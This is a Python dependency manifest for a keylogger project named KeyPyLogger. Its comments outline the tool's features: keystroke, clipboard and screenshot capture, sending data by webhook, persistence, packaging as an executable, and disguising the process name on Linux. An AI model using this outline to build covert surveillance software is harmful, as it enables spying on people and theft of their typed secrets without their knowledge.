# KeyPyLogger Dependencies v2.0

# ===== CORE DEPENDENCIES =====
# Core keylogging library - cross-platform keyboard monitoring
pynput>=1.7.6

# HTTP requests for webhook communication
requests>=2.31.0

# ===== ADVANCED FEATURES DEPENDENCIES =====
# Clipboard monitoring
pyperclip>=1.8.2

# Screenshot capture (compatible with Python 3.14+)
Pillow>=10.4.0
pyscreenshot>=3.1; sys_platform != 'win32'  # Fallback for Linux only

# Process monitoring and management
psutil>=5.9.0

# ===== WINDOWS-SPECIFIC (Optional) =====
# Windows COM for shortcuts (persistence)
pywin32>=306; sys_platform == 'win32'

# ===== OPTIONAL DEPENDENCIES =====
# For building standalone executables
pyinstaller>=6.0.0

# For process name spoofing on Linux (self-protection)
setproctitle>=1.3.0; sys_platform != 'win32'
